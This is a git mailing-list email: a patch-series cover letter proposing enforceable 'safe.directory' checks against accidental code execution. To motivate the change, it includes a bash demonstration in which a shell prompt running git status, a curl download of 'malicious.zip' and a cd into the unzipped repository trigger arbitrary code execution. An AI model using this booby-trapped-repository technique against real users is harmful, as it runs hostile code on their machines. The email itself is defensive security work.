Received: from mail.lohmann.sh (mail.lohmann.sh [23.88.42.106])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F17D62FDC37
	for <git@vger.kernel.org>; Mon, 13 Oct 2025 09:42:31 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=23.88.42.106
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1760348560; cv=none; b=trb4WfQzHofrAj2qCbSWX/8T3OTg3ts7BvJvJVUYmEnUqkAnjCc/i3aYI1DZQ9YvYmbtyrWzhSjT0chB3ooRyorcAoEnU1rWCsweAt9hNGD2A/fEUEubYBMNH4KNvXIJHZbhQxnLSLFnojAqb9kK95qXVjvbgexkhGx2J3OK8ZE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1760348560; c=relaxed/simple;
	bh=0O7AvJDaPB5KqhsqIUpowa5y5MTg7pjYAV0aNOm8MrM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=dplzrO5JgYR/hn3LdkwGE91A8jXMDcbCMEaYfUQB5NcHKASNdkW1Ul0Wqrs9CL9cF3l6y6l2diIJPd0tTLN3HBGmEXKOOX+GlTabri3ISeZqW+kIVPb4JQmVBJuQG5LE25bJXR3O7o+grMSxjls9gLBLuXpcJ+NFSqCkOJw7Xb4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=lohmann.sh; spf=pass smtp.mailfrom=lohmann.sh; dkim=pass (2048-bit key) header.d=lohmann.sh header.i=@lohmann.sh header.b=YoCJDEDN; arc=none smtp.client-ip=23.88.42.106
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=lohmann.sh
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lohmann.sh
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=lohmann.sh header.i=@lohmann.sh header.b="YoCJDEDN"
From: Michael Lohmann <git@lohmann.sh>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=lohmann.sh; s=mail3;
	t=1760348543;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding;
	bh=7q4xskqiVgdrzhDAfatJtjWlQogK7/ne/ZR0JhNuuBI=;
	b=YoCJDEDNFptXZVdw96gLMQaqdZBBja4sDmZcmK4oxcocDQVs2bvItDLNpjavjZZAG5XDh2
	+ED77lEI89WF8dR8AYSAYxMojn7T5ofpYPNppaWHkt70b7QFbgGDQn+qjXODNWEaOnhgHr
	5gvGqWPD4d7NgHIF3JlsqLXdfQKHIu4t1XsB3lEPSHalJ9Y8diOoOdEwGnxDXYAtmm9gtu
	x+z/ULjsy9OXaQtqSA8c0bTfb2jKmtnt166aOnNKh68jmV4lZfwt4/mHSzXlJiXpQ/28AI
	WRvUHLeTaDXl+jrm4hsWp9fuSLHhvNjUp+VcS/MJwCttgWUmtJarS0Zza7YDaw==
To: git@vger.kernel.org
Cc: Michael Lohmann <git@lohmann.sh>,
	Jeff King <peff@peff.net>
Subject: [PATCH 0/5] Allow enforcing safe.directory
Date: Mon, 13 Oct 2025 11:41:41 +0200
Message-ID: <20251013094152.23597-1-git@lohmann.sh>
Precedence: bulk
X-Mailing-List: git@vger.kernel.org
List-Id: <git.vger.kernel.org>
List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hey everyone!

As a first step to allow making git more resistant against accidental
arbitrary code execution, Jeff King suggested in

 https://lore.kernel.org/git/20251009224317.77565-1-git@lohmann.sh/T/#m6cce96f9ae58a4341ae3fbbc02110e20547c58bc

to make the "safe.directory" config enforcable.
If a user has a command line status like:

```bash
# Let's assume the simplest command status prompt that shows "(+)" if
# there are uncommitted changes:
export PS1='$(if [ -n "$(git status --short 2>/dev/null)" ]; then; echo "(+)"; fi)> '

# You download a random zip folder from the internet, not knowing it is
# actually a repo:
curl --silent https://www.lohmann.sh/nuggits/002-dangerous-git/malicious.zip --output malicious.zip
# unzipping means the folder is owned by the user, so by default git
# assumes it is safe to execute hooks/config
unzip malicious.zip >/dev/null

echo 'Just a "README" no "xxx" file, see:'
ls malicious

# This `cd` now triggers arbitrary code execution due to `git status`:
cd malicious
# now there is an "xxx" file
```

With this feature, the prompt could either perform
`git --assume-unsafe status` or to make all git invocations by any
programs safe against accidental arbitrary code invocations a user could
set "safe.assumeUnsafe" to true.

Also allow to temporarily bypass this check with a new `--allow-unsafe`
flag.

--Michael

Michael Lohmann (5):
  setup: rename `ensure_safe_repository()` for clarity
  setup: rename `die_upon_assumed_unsafe_repo()` to align with check
  setup: refactor `ensure_safe_repository()` testing priorities
  setup: allow temporary bypass of `ensure_safe_repository()` checks
  setup: allow not marking self owned repos as safe in
    `ensure_safe_repository()`

 Documentation/config/safe.adoc    |  9 ++++
 Documentation/git.adoc            | 25 +++++++++++
 builtin/clone.c                   |  2 +-
 environment.h                     |  2 +
 git.c                             |  9 ++++
 path.c                            |  4 +-
 setup.c                           | 45 ++++++++++++++------
 setup.h                           |  2 +-
 t/meson.build                     |  1 +
 t/t0036-allow-unsafe-directory.sh | 70 +++++++++++++++++++++++++++++++
 10 files changed, 153 insertions(+), 16 deletions(-)
 create mode 100755 t/t0036-allow-unsafe-directory.sh

-- 
2.50.1 (Apple Git-155)

